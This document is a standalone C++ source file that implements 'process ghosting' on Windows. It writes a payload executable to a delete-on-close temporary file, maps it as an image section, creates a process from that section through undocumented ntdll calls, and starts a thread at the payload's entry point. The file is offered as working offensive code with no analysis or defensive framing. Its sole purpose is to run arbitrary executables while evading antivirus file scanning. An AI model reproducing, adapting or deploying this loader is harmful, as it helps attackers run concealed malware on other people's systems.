#include <Windows.h>
#include <winternl.h>
#include <iostream>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef NTSTATUS(NTAPI* _NtCreateProcessEx)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL,
    IN BOOLEAN InJob
);

typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize OPTIONAL,
    IN SIZE_T MaximumStackSize OPTIONAL,
    IN PVOID AttributeList OPTIONAL
);

typedef NTSTATUS(NTAPI* _NtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

HANDLE CreateDeletePendingFile(LPCWSTR path, BYTE* payload, SIZE_T size) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE | DELETE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD written;
    WriteFile(hFile, payload, (DWORD)size, &written, NULL);
    return hFile;
}

HANDLE CreateSectionFromFile(HANDLE hFile) {
    HANDLE hSection = NULL;
    _NtCreateSection NtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateSection");
    if (!NtCreateSection) return NULL;

    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    return NT_SUCCESS(status) ? hSection : NULL;
}

BYTE* ReadPayloadFromDisk(LPCWSTR filePath, SIZE_T& outSize) {
    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    outSize = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, outSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    ReadFile(hFile, buffer, outSize, &bytesRead, NULL);
    CloseHandle(hFile);
    return buffer;
}

HANDLE CreateGhostProcess(HANDLE hSection) {
    HANDLE hProcess = NULL;
    _NtCreateProcessEx NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateProcessEx");
    if (!NtCreateProcessEx) return NULL;

    NTSTATUS status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 4, hSection, NULL, NULL, FALSE);
    return NT_SUCCESS(status) ? hProcess : NULL;
}

ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen = 0;

    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) return 0;

    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
    if (!NT_SUCCESS(status)) return 0;

    BYTE pebBuffer[sizeof(PEB)] = {};
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBuffer, sizeof(pebBuffer), NULL))
        return 0;

    PVOID baseAddr = ((PPEB)pebBuffer)->ImageBaseAddress;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    return (ULONG_PTR)baseAddr + ntHeaders->OptionalHeader.AddressOfEntryPoint;
}

BOOL InjectAndRun(HANDLE hProcess, ULONG_PTR entryPoint) {
    HANDLE hThread = NULL;
    _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");
    if (!NtCreateThreadEx) return FALSE;

    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, NULL);

    return NT_SUCCESS(status);
}

BOOL ProcessGhosting(LPCWSTR payloadPath) {
    SIZE_T payloadSize = 0;
    BYTE* payload = ReadPayloadFromDisk(payloadPath, payloadSize);
    if (!payload) {
        std::wcerr << L"[-] Failed to read payload\n";
        return FALSE;
    }

    WCHAR tempPath[MAX_PATH], tempFile[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"PG", 0, tempFile);

    HANDLE hFile = CreateDeletePendingFile(tempFile, payload, payloadSize);
    if (!hFile) {
        std::wcerr << L"[-] Failed to create temp file\n";
        return FALSE;
    }

    HANDLE hSection = CreateSectionFromFile(hFile);
    if (!hSection) {
        std::wcerr << L"[-] Failed to create section from file\n";
        return FALSE;
    }

    HANDLE hProcess = CreateGhostProcess(hSection);
    if (!hProcess) {
        std::wcerr << L"[-] Failed to create ghost process\n";
        return FALSE;
    }

    ULONG_PTR entry = GetEntryPoint(hProcess, payload);
    if (!entry || !InjectAndRun(hProcess, entry)) {
        std::wcerr << L"[-] Failed to inject and run thread\n";
        return FALSE;
    }

    std::wcout << L"[+] Process Ghosting successfully completed\n";
    return TRUE;
}

int wmain() {
    if (!ProcessGhosting(L"C:\\temp\\payload64.exe")) {
        std::wcerr << L"[-] Ghosting failed\n";
    }
    system("pause");
    return 0;
}
